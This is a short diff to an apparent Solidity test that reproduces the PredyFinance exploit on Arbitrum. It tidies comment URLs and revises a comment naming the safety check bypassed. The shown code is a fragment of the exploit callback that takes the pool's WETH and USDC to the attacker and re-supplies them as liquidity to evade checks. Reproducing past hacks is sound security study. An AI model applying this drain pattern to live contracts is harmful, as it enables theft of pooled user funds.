@@ -8,7 +8,7 @@ import "../interface.sol";
 // Attacker : https://arbiscan.io/address/https://arbiscan.io/address/0x76b02ab483482740248e2ab38b5a879a31c6d008
 // Attack Contract : https://arbiscan.io/address/https://arbiscan.io/address/0xb79714634895f52a4f6a75eceb58c96246370149
 // Vulnerable Contract : https://arbiscan.io/address/https://arbiscan.io/address/0x7b8b944ab2f24c829504a7a6d70fce5298f2147c
-// Attack Tx : https://arbiscan.io/tx/https://arbiscan.io/tx/0xbe163f651d23f0c9e4d4a443c0cc163134a31a1c2761b60188adcfd33178f50f
+// Attack Tx : https://arbiscan.io/tx/0xbe163f651d23f0c9e4d4a443c0cc163134a31a1c2761b60188adcfd33178f50f
 
 // @Info
 // Vulnerable Contract Code : https://arbiscan.io/address/https://arbiscan.io/address/0x7b8b944ab2f24c829504a7a6d70fce5298f2147c#code
@@ -82,7 +82,7 @@ contract PredyFinance is BaseTestWithBalanceLog {
         IPredyPool.TradeResult memory tradeResult
     ) external {
         predyPool.take(true, address(this), WETH.balanceOf(address(predyPool))); // take the asset to the attacker
-        predyPool.supply(tradeParams.pairId, true, WETH.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function finalizeLock()
+        predyPool.supply(tradeParams.pairId, true, WETH.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function PositionCalculator.checkSafe()
 
         predyPool.take(false, address(this), USDC.balanceOf(address(predyPool))); // take the asset to the attacker
         predyPool.supply(tradeParams.pairId, false, USDC.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function finalizeLock()
